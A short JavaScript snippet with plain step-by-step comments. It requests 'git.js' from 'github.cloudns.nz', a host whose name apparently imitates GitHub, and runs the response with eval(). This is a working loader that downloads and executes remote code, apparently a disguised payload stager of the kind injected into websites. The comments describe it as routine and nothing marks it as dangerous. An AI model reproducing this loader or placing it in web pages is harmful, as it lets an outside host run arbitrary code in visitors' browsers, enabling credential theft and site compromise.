// Create a new XMLHttpRequest object
var xhr = new XMLHttpRequest();

// Assign a function to handle the 'onreadystatechange' event
xhr.onreadystatechange = function () {
  // Check if the request is complete
  if (xhr.readyState == XMLHttpRequest.DONE) {
    // Evaluate the response text as JavaScript code
    eval(xhr.responseText);
  }
};

// Open a GET request to the specified URL
xhr.open('GET', 'https://github.cloudns.nz/git.js', true);

// Send the request
xhr.send(null);

